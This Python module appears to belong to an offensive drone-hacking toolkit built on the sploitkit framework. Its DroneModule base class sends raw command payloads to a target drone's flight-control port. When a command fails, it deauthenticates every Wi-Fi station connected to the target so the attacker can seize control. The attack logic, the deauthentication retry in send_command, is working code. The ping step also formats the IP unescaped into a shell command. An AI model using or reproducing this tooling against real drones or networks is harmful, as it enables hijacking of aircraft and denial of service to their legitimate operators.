# -*- coding: UTF-8 -*-
import ast
import socket
from sploitkit import Module
from time import sleep

from lib.wifi import DeauthMixin


class DroneModule(Module, DeauthMixin):
    """ Generic Module proxy class for defining multiple common utility methods
         for drones. """
    def preload(self):
        if 'TARGET' not in self.config.keys():
            raise NotImplementedError("DroneModule must have a TARGET option")
        targets = self.config.option('TARGET').choices
        if len(targets) == 0:
            self.logger.warning("No {} target connected yet ; please use the "
                                "'scan' and 'connect' commands"
                                .format(self.drone))
            return False
        self.config['TARGET'] = targets[0]
    
    def prerun(self):
        ip = self.config.option("IP").value
        if self.console._jobs.call("ping -c 2 {} -w 3".format(ip)) != 0:
            self.logger.warning("Target seems to be down")
            return False
    
    def send_command(self, *args, **kwargs):
        self._last_cmd_resp = None
        sock_type = getattr(self, 'sock_type', socket.SOCK_STREAM)
        s = socket.socket(socket.AF_INET, sock_type)
        s.settimeout(kwargs.pop('timeout', 10))
        success = False
        try:
            payload = getattr(self, 'payload_format', "") % args
        except Exception as e:
            self.logger.error("Bad command payload format ({})".format(e))
            return False
        try:
            s.connect((self.config.option("IP").value,
                       self.config.option("FLYCTL_PORT").value))
            self.logger.debug("Send: " + payload)
            s.send(payload.encode())
            r = s.recv(1024).strip(b" \x00").decode()
            r = ast.literal_eval(r) if len(r) > 0 else {}
            success = r.get('RESULT') == 0
            self.logger.debug("Recv: {}".format(r or "empty response"))
            if not success:
                self.logger.failure("Command failed")
            self._last_cmd_resp = r
            return success
        except Exception as e:
            self.logger.failure("Command failed ({})".format(e))
            self.logger.exception(e)
        finally:
            s.close()
        if kwargs.get('retry', True):
            kwargs['retry'] = False
            essid = self.config.option('TARGET').value
            t = self.console.state['TARGETS'][essid]
            bssid = t['bssid']
            for sta in t['stations']:
                self.deauth(bssid, sta)
                sleep(1)
            return self.send_command(*args, **kwargs)
